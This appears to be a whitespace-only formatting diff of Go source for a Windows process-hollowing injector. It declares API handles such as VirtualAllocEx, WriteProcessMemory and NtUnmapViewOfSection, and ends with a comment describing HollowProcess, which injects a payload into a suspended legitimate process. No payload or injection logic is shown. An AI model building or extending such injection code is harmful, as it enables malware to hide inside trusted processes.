@@ -14,42 +14,42 @@ import (
 )
 
 var (
-	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
-	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
-	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
-	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
-	procGetThreadContext         = kernel32.NewProc("GetThreadContext")
-	procSetThreadContext         = kernel32.NewProc("SetThreadContext")
-	procResumeThread             = kernel32.NewProc("ResumeThread")
-	procNtUnmapViewOfSection     = ntdll.NewProc("NtUnmapViewOfSection")
+	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
+	ntdll                         = syscall.NewLazyDLL("ntdll.dll")
+	procCreateProcessW            = kernel32.NewProc("CreateProcessW")
+	procVirtualAllocEx            = kernel32.NewProc("VirtualAllocEx")
+	procWriteProcessMemory        = kernel32.NewProc("WriteProcessMemory")
+	procGetThreadContext          = kernel32.NewProc("GetThreadContext")
+	procSetThreadContext          = kernel32.NewProc("SetThreadContext")
+	procResumeThread              = kernel32.NewProc("ResumeThread")
+	procNtUnmapViewOfSection      = ntdll.NewProc("NtUnmapViewOfSection")
 	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
-	procVirtualProtect           = kernel32.NewProc("VirtualProtect")
+	procVirtualProtect            = kernel32.NewProc("VirtualProtect")
 )
 
 const (
-	PAGE_EXECUTE_READ      = 0x20
+	PAGE_EXECUTE_READ = 0x20
 )
 
 const (
-	CREATE_SUSPENDED     = 0x00000004
-	PROCESS_ALL_ACCESS   = 0x001F0FFF
-	MEM_COMMIT           = 0x00001000
-	MEM_RESERVE          = 0x00002000
-	PAGE_EXECUTE_READWRITE = 0x40
-	CONTEXT_FULL         = 0x10007
+	CREATE_SUSPENDED          = 0x00000004
+	PROCESS_ALL_ACCESS        = 0x001F0FFF
+	MEM_COMMIT                = 0x00001000
+	MEM_RESERVE               = 0x00002000
+	PAGE_EXECUTE_READWRITE    = 0x40
+	CONTEXT_FULL              = 0x10007
 	PROCESS_BASIC_INFORMATION = 0
 )
 
 type StartupInfo struct {
-	Cb              uint32
-	_               [44]byte
-	Flags           uint32
-	ShowWindow      uint16
-	_               [18]byte
-	StdOutput       syscall.Handle
-	StdError        syscall.Handle
-	StdInput        syscall.Handle
+	Cb         uint32
+	_          [44]byte
+	Flags      uint32
+	ShowWindow uint16
+	_          [18]byte
+	StdOutput  syscall.Handle
+	StdError   syscall.Handle
+	StdInput   syscall.Handle
 }
 
 type ProcessInfo struct {
@@ -60,11 +60,11 @@ type ProcessInfo struct {
 }
 
 type ProcessBasicInfo struct {
-	Reserved1            uintptr
-	PebBaseAddress       uintptr
-	Reserved2            [2]uintptr
-	UniqueProcessId      uintptr
-	Reserved3            uintptr
+	Reserved1       uintptr
+	PebBaseAddress  uintptr
+	Reserved2       [2]uintptr
+	UniqueProcessId uintptr
+	Reserved3       uintptr
 }
 
 // HollowProcess creates a suspended legitimate process and injects the payload binary into it.
